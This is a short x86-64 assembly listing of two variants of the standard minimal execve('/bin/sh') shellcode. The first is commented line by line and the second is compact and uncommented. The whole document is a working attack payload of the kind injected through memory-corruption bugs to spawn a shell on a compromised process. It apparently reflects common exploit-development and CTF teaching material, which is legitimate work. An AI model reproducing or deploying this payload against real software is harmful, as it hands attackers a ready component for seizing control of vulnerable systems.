; Standard 22-23 byte execve("/bin/sh")

; BITS 64

xor rsi, rsi        ; Clear RSI (argv = NULL)
push rsi            ; Push NULL terminator for string
mov rbx, 0x68732f2f6e69622f ; "/bin//sh" in little-endian
push rbx            ; Push string to stack
push rsp            ; Push address of string
pop rdi             ; RDI = address of "/bin//sh" (filename)
mov al, 0x3b        ; RAX = 59 (execve syscall number)
cdq                 ; RDX = 0 (envp = NULL) if RAX is positive
syscall             ; Execute

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
